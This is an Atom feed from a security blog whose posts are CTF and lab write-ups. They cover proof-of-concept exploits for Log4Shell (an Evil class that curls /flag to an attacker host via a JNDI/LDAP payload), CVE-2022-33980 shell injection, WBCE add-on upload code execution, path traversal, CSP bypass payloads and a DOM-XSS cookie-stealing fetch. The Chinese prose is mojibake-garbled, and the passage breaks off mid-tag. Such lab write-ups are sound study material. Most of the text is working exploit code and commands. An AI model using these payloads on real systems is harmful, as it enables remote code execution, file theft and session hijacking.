<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kaikaix</title>
  
  <subtitle>å°ç™½</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-08-27T04:22:42.508Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>kaikaix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œCVE</title>
    <link href="http://example.com/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/"/>
    <id>http://example.com/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/</id>
    <published>2023-08-27T03:45:45.000Z</published>
    <updated>2023-08-27T04:22:42.508Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVEç³»åˆ—"><a href="#CVEç³»åˆ—" class="headerlink" title="CVEç³»åˆ—"></a>CVEç³»åˆ—</h1><p>ä¸è¯¦ç»†è®²åŸç†ï¼Œåªå‘ä¸€ä¸‹poc<br><span id="more"></span></p><h2 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h2><p>log4j<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;curl -X POST -F xx=@/flag  http://xxï¼š8999&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å…ˆè¿è¡Œmarshalsec<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://xx:8000/#Evil&quot; 1099</code></p><p>åŒæ—¶éœ€è¦åœ¨8000ç«¯å£èµ·ä¸ªwebæœåŠ¡<br><code>python3 -m http.server 8000</code></p><p>è¦åœ¨8999ç«¯å£èµ·ä¸ªncï¼Œç”¨äºæ¥å—flag<br><code>nc -lvp 8999</code></p><p>è¾“å…¥æ¡†è¾“å…¥<br><code>$&#123;jndi:ldap://xx:1099/evil&#125;</code></p><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸å¯ä»¥åå¼¹shellï¼Œå°±ç›´æ¥ç”¨curläº†</p><h2 id="CVE-2022-33980"><a href="#CVE-2022-33980" class="headerlink" title="CVE-2022-33980"></a>CVE-2022-33980</h2><p>payload<br><code>Url?url=http://xx:8000/test.xml&amp;data=path</code></p><p>test.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>$&#123;script:js:java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;xxx&#125;&quot;)&#125;<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><br>ç›´æ¥å¼¹shell</p><blockquote><p><code>$&#123;url:utf-8:file:///&#125;</code>å¯ä»¥ç”¨äºè¯»å–ç›®å½•<br><code>$&#123;url:utf-8:file:///flag&#125;</code>å¯ä»¥ç”¨äºè¯»å–æ–‡ä»¶</p></blockquote><h2 id="CVE-2022-25101"><a href="#CVE-2022-25101" class="headerlink" title="CVE-2022-25101"></a>CVE-2022-25101</h2><p><a href="http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/">http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/</a><br><code>admin123456</code><br>è¿›å…¥åå°<br><img src="/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/1.png" alt><br>installå¤„é€‰æ‹©ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå…¶ä¸­è¦æœ‰info.phpï¼Œinfo.phpå†™å…¥ä½ çš„payloadå³å¯<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$archive</span> = <span class="keyword">new</span> <span class="title class_">PclZip</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract Add-on files into WBCE temp folder</span></span><br><span class="line"><span class="variable">$addon_root_path</span> = <span class="title function_ invoke__">find_addon_root_path</span>(<span class="variable">$archive</span>);</span><br><span class="line"><span class="variable">$list</span> = <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">extract</span>(</span><br><span class="line">    PCLZIP_OPT_PATH,</span><br><span class="line">    <span class="variable">$temp_unzip</span>,</span><br><span class="line">    PCLZIP_CB_PRE_EXTRACT,</span><br><span class="line">    <span class="string">&#x27;pclzip_extraction_filter&#x27;</span>,</span><br><span class="line">    PCLZIP_OPT_REPLACE_NEWER</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if uploaded file is a valid Add-On zip file</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$list</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>))) &#123;</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">print_error</span>(<span class="variable">$MESSAGE</span>[<span class="string">&#x27;GENERIC_INVALID_ADDON_FILE&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the templates info file</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$template_directory</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$theme_directory</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>);</span><br></pre></td></tr></table></figure><br>çœ‹çœ‹éƒ¨åˆ†æºç ï¼Œå¯ä»¥çœ‹åˆ°ä»–æŠŠå‹ç¼©åŒ…çš„å†…å®¹è§£å‹å‡ºæ¥ï¼Œç„¶årequireäº†info.php</p><h2 id="CVE-2021-44665"><a href="#CVE-2021-44665" class="headerlink" title="CVE-2021-44665"></a>CVE-2021-44665</h2><p>searchsploitç›¸åº”çš„payloadå³å¯<br>æŠŠ<br><code>../../database</code><br>æ”¹ä¸º<br><code>../../../../../../flag</code><br>å³å¯<br>åŸç†å¤§æ¦‚å°±æ˜¯æœ‰ä¸€å¤„insertçš„sqlæ“ä½œæ²¡æœ‰é‰´æƒï¼Œå¯ä»¥ç”¨äºæ·»åŠ ç›¸åº”çš„idï¼Œç„¶ååœ¨getfile.phpä¸­å¯ä»¥è·å–åˆ°è¯¥idï¼Œç»•è¿‡é‰´æƒï¼Œå¹¶ä¸”ä»–è¯»å–æ–‡ä»¶çš„æ“ä½œæ²¡æœ‰è¿‡æ»¤../ï¼Œå…·ä½“åŸç†å¯ä»¥è‡ªè¡Œåˆ†æ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CVEç³»åˆ—&quot;&gt;&lt;a href=&quot;#CVEç³»åˆ—&quot; class=&quot;headerlink&quot; title=&quot;CVEç³»åˆ—&quot;&gt;&lt;/a&gt;CVEç³»åˆ—&lt;/h1&gt;&lt;p&gt;ä¸è¯¦ç»†è®²åŸç†ï¼Œåªå‘ä¸€ä¸‹poc&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="é¶åœº" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
    <category term="cve" scheme="http://example.com/tags/cve/"/>
    
    <category term="é¶åœº" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="sql" scheme="http://example.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>codeql</title>
    <link href="http://example.com/2023/08/06/codeql/"/>
    <id>http://example.com/2023/08/06/codeql/</id>
    <published>2023-08-06T08:49:35.000Z</published>
    <updated>2023-08-06T08:49:35.086Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>csp ç­–ç•¥åŠç»•è¿‡</title>
    <link href="http://example.com/2023/07/20/csp-%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2023/07/20/csp-%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</id>
    <published>2023-07-20T03:44:40.000Z</published>
    <updated>2023-07-22T18:17:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="éƒ¨åˆ†cspç»•è¿‡æ–¹æ³•"><a href="#éƒ¨åˆ†cspç»•è¿‡æ–¹æ³•" class="headerlink" title="éƒ¨åˆ†cspç»•è¿‡æ–¹æ³•"></a>éƒ¨åˆ†cspç»•è¿‡æ–¹æ³•</h2><span id="more"></span><h3 id="unsafe-eval-ï¼Ÿ"><a href="#unsafe-eval-ï¼Ÿ" class="headerlink" title="unsafe-eval ï¼Ÿ"></a>unsafe-eval ï¼Ÿ</h3><p>cspç­–ç•¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;unsafe-eval&#x27; data: </span><br></pre></td></tr></table></figure><br>ç»•è¿‡ä»£ç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="CDNåŠ è½½æ—§ç‰ˆjs"><a href="#CDNåŠ è½½æ—§ç‰ˆjs" class="headerlink" title="CDNåŠ è½½æ—§ç‰ˆjs"></a>CDNåŠ è½½æ—§ç‰ˆjs</h3><p>cspç­–ç•¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src: https://cdnjs.cloudflare.com ;</span><br></pre></td></tr></table></figure><br>exp<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span> &#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;alert(1);//&#x27;);&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h3 id="CRLFç»•è¿‡"><a href="#CRLFç»•è¿‡" class="headerlink" title="CRLFç»•è¿‡"></a>CRLFç»•è¿‡</h3><p>å°†cspç­–ç•¥æŒ¤åˆ°è¿”å›åŒ…çš„bodyä¸­,è®°å¾—æ³¨æ„content-length</p><h3 id="ä¸å®Œæ•´scriptæ ‡ç­¾ç»•è¿‡"><a href="#ä¸å®Œæ•´scriptæ ‡ç­¾ç»•è¿‡" class="headerlink" title="ä¸å®Œæ•´scriptæ ‡ç­¾ç»•è¿‡"></a>ä¸å®Œæ•´scriptæ ‡ç­¾ç»•è¿‡</h3><p>å½“æµè§ˆå™¨ç¢°åˆ°ä¸€ä¸ªå·¦å°–æ‹¬å·æ—¶ï¼Œä¼šå˜æˆæ ‡ç­¾å¼€å§‹çŠ¶æ€ï¼Œç„¶åä¼šä¸€ç›´æŒç»­åˆ°ç¢°åˆ°å³å°–æ‹¬å·ä¸ºæ­¢ï¼Œåœ¨å…¶ä¸­çš„æ•°æ®éƒ½ä¼šè¢«å½“æˆæ ‡ç­¾åæˆ–è€…å±æ€§</p><p>csp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection:0&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-xxxxx&#x27;&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]<span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">&#x27;xxxxx&#x27;</span>&gt;<span class="comment">//do some thing</span></span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><br>exp<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="attr">data</span>:text/plain,<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h3 id="iframeç¦æ­¢csp"><a href="#iframeç¦æ­¢csp" class="headerlink" title="iframeç¦æ­¢csp"></a>iframeç¦æ­¢csp</h3><ul><li>iframeæ ‡ç­¾å¯ä»¥è®¾ç½®cspï¼Œå¯ä»¥ç¦æ­¢æ‰æŸäº›å‰ç«¯è¿‡æ»¤çš„js</li><li>å¦‚æœé¡µé¢Aä¸­æœ‰CSPé™åˆ¶ï¼Œä½†æ˜¯é¡µé¢Bä¸­æ²¡æœ‰ï¼ŒåŒæ—¶Aå’ŒBåŒæºï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨Aé¡µé¢ä¸­åŒ…å«Bé¡µé¢æ¥ç»•è¿‡CSP</li></ul><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><p>metaæ ‡ç­¾æœ‰ä¸€äº›ä¸å¸¸ç”¨çš„åŠŸèƒ½æœ‰æ—¶å€™æœ‰å¥‡æ•ˆï¼š<br>metaå¯ä»¥æ§åˆ¶ç¼“å­˜ï¼ˆåœ¨headeræ²¡æœ‰è®¾ç½®çš„æƒ…å†µä¸‹ï¼‰ï¼Œæœ‰æ—¶å€™å¯ä»¥ç”¨æ¥ç»•è¿‡CSP nonceã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;cache-control&quot;</span> content=<span class="string">&quot;public&quot;</span>&gt;</span><br></pre></td></tr></table></figure><br>metaå¯ä»¥è®¾ç½®Cookieï¼ˆFirefoxä¸‹ï¼‰ï¼Œå¯ä»¥ç»“åˆself-xssåˆ©ç”¨ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Set-Cookie&quot;</span> <span class="title class_">Content</span>=<span class="string">&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;</span>&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>è¿˜æœ‰æ›´å¤šå¯ä»¥å‚è€ƒä¸‹é¢çš„é“¾æ¥</p></blockquote><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-eval">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-eval</a></li><li><a href="https://www.jianshu.com/p/f1de775bc43e">https://www.jianshu.com/p/f1de775bc43e</a></li><li><a href="https://cloud.tencent.com/developer/chapter/13541">https://cloud.tencent.com/developer/chapter/13541</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;éƒ¨åˆ†cspç»•è¿‡æ–¹æ³•&quot;&gt;&lt;a href=&quot;#éƒ¨åˆ†cspç»•è¿‡æ–¹æ³•&quot; class=&quot;headerlink&quot; title=&quot;éƒ¨åˆ†cspç»•è¿‡æ–¹æ³•&quot;&gt;&lt;/a&gt;éƒ¨åˆ†cspç»•è¿‡æ–¹æ³•&lt;/h2&gt;</summary>
    
    
    
    <category term="å‰ç«¯" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="å‰ç«¯" scheme="http://example.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="js" scheme="http://example.com/tags/js/"/>
    
    <category term="csp" scheme="http://example.com/tags/csp/"/>
    
  </entry>
  
  <entry>
    <title>å‰ç«¯ctf(æŒç»­æ›´æ–°)</title>
    <link href="http://example.com/2023/07/06/%E5%89%8D%E7%AB%AFctf/"/>
    <id>http://example.com/2023/07/06/%E5%89%8D%E7%AB%AFctf/</id>
    <published>2023-07-06T00:27:30.000Z</published>
    <updated>2023-08-06T10:17:39.935Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æŒç»­æ›´æ–°ä¸€äº›å›½å¤–çš„å‰ç«¯ctfï¼Œå› ä¸ºæ¥è§¦çš„å‰ç«¯åå°‘ï¼Œè¿™é‡Œå°±é›†ä¸­å†™ä¸€ä¸‹wp<br><span id="more"></span></p><h2 id="uiuctf-peanut-xss"><a href="#uiuctf-peanut-xss" class="headerlink" title="uiuctf peanut-xss"></a>uiuctf peanut-xss</h2><p>nutshell.jsä¸­æœ‰ä¸€æ®µä»£ç <br><code>linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>å…¶ä¸­innerTextä¼šhtmlè§£ç ï¼Œè€ŒinnerHTMLä¼šæŠŠèµ‹å€¼çš„å†…å®¹åŸå°ä¸åŠ¨çš„è¾“å‡ºåˆ°é¡µé¢ä¸­ï¼Œæ‰€ä»¥å¦‚æœè¾“å…¥çš„æ˜¯<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;<span class="regexp">/span&amp;gt;&amp;lt;img src onerror=&amp;#39;fetch(&amp;quot;https:/</span><span class="regexp">/vps/</span>?cookie=&amp;quot;+<span class="variable language_">document</span>.<span class="property">cookie</span>)&amp;#<span class="number">39</span>;/&amp;gt;&amp;lt;span&amp;gt;</span><br></pre></td></tr></table></figure><br>è§£ç å®Œä»¥åå°±æ˜¯<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/span&gt;&lt;img src onerror=&#x27;fetch(&quot;https:/</span><span class="regexp">/vps/</span>?cookie=<span class="string">&quot;+document.cookie)&#x27;/&gt;&lt;span&gt;</span></span><br></pre></td></tr></table></figure><br>å†æŠŠè§£ç çš„å†…å®¹èµ‹å€¼ç»™innerHTMLï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆdom xss<br>ä¿®å¤è¿™ä¸ªæ¼æ´çš„è¯å¯ä»¥æŠŠinnerHTMLæ”¹æˆinnerText<br><code>linkText.innerText = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>å½“innerTextæ˜¯è¢«èµ‹å€¼çš„æ—¶å€™ï¼Œè¾“å‡ºåˆ°é¡µé¢çš„æ—¶å€™ä¼šæŠŠhtmlç¼–ç åœ¨è¾“å‡º</p><h2 id="google-ctf-biohazard"><a href="#google-ctf-biohazard" class="headerlink" title="google ctf biohazard"></a>google ctf biohazard</h2><p><a href="https://github.com/google/google-ctf/tree/master/2023/web-biohazard">https://github.com/google/google-ctf/tree/master/2023/web-biohazard</a><br>è¿™æ˜¯å®˜æ–¹writeupï¼Œåªå¯¹å…¶ä¸­ä¸€äº›ç‚¹è¿›è¡Œè®°å½•</p><h3 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h3><p>å½“æ—¶çœ‹åˆ°Object.assignè”æƒ³åˆ°äº†åŸå‹é“¾æ±¡æŸ“ï¼Œä½†æ˜¯æˆ‘æ˜¯ç”¨ç±»ä¼¼ä¸‹é¢çš„æ–¹å¼å»å°è¯•åŸå‹é“¾æ±¡æŸ“çš„ï¼Œæ˜¾ç„¶æ˜¯å¤±è´¥äº†<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><br>ä½†æ˜¯å¦‚æœæ˜¯ä¸‹é¢è¿™ç§å°±æ˜¯å¯ä»¥æˆåŠŸæ±¡æŸ“çš„<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>((&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>], <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;polluted&quot;: true&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><h3 id="æ±¡æŸ“çš„ç‚¹-editor"><a href="#æ±¡æŸ“çš„ç‚¹-editor" class="headerlink" title="æ±¡æŸ“çš„ç‚¹ editor"></a>æ±¡æŸ“çš„ç‚¹ editor</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadEditorResources</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#editor-style&#x27;</span>).<span class="property">content</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">  <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  safeScriptEl.<span class="title function_">setSrc</span>(script, <span class="title function_">trustedResourceUrl</span>(editor));</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>();</span><br><span class="line">  <span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_">loadEditorResources</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å½“uriå¼€å¤´ä¸æ˜¯viewçš„æ—¶å€™å°±ä¼šåŠ è½½è¿™ä¸ªloadEditorResourceså‡½æ•°<br>è€Œè¿™ä¸ªå‡½æ•°ä¸­<br><code>safeScriptEl.setSrc(script, trustedResourceUrl(editor));</code><br>è¿™ä¸€æ®µä¼šè®¾ç½®ä¸€ä¸ªjsåŠ è½½è¿›å»ï¼Œ<em>å¹¶ä¸”ä¼šè®¾ç½®å¥½nonce</em>ï¼Œå…¶ä¸­editoråœ¨bootstrap.jsä¸­è¢«å®šä¹‰äº†ï¼Œæ‰€ä»¥åªéœ€è¦åŸå‹é“¾è¦†ç›–äº†è¿™ä¸ªeditorå°±å¯ä»¥äº†</p><h3 id="ç»•è¿‡csp"><a href="#ç»•è¿‡csp" class="headerlink" title="ç»•è¿‡csp"></a>ç»•è¿‡csp</h3><p>å› ä¸ºæœ‰cspç­–ç•¥ï¼Œæ— æ³•è¿›è¡Œç›´æ¥åŠ è½½jsï¼ŒåŸå‹é“¾æ±¡æŸ“ä¸èƒ½ç›´æ¥è¦†ç›–è¢«èµ‹å€¼çš„å˜é‡ï¼Œæ‰€ä»¥åˆ©ç”¨iframeï¼Œè®¾ç½®cspï¼Œå…è®¸æ¶æ„çš„jsåŠ è½½ï¼Œå¹¶ä¸”ç¦æ­¢åŠ è½½bootstrapï¼Œå°±å¯ä»¥æˆåŠŸç»•è¿‡<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com/views/view/5f1a24e1-2744-42e2-8127-19fccd9c3f98&quot;</span> csp=<span class="string">&quot;script-src https://attack.shhnjk.com/alert.js https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>åœ¨è¿™é‡Œæˆ‘æƒ³åˆ°å¦‚æœæ²¡æœ‰nonceï¼Œä»–åªæ˜¯script-src <a 